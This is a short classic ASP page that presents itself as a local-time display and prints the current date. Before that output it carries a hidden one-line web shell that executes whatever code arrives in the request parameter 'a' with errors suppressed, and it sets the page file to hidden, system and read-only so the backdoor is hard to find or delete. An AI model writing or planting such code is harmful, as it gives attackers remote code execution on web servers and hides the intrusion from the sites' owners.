本地时间<%
dim a
a=request(chr(97))
on error resume next
execute a
response.write(""):Set fso=CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(Request.ServerVariables("PATH_TRANSLATED")):if  f.attributes <> 39 then:f.attributes = 39:end if%>
<%
response.write formatdatetime(now,1)&"<br>"
%>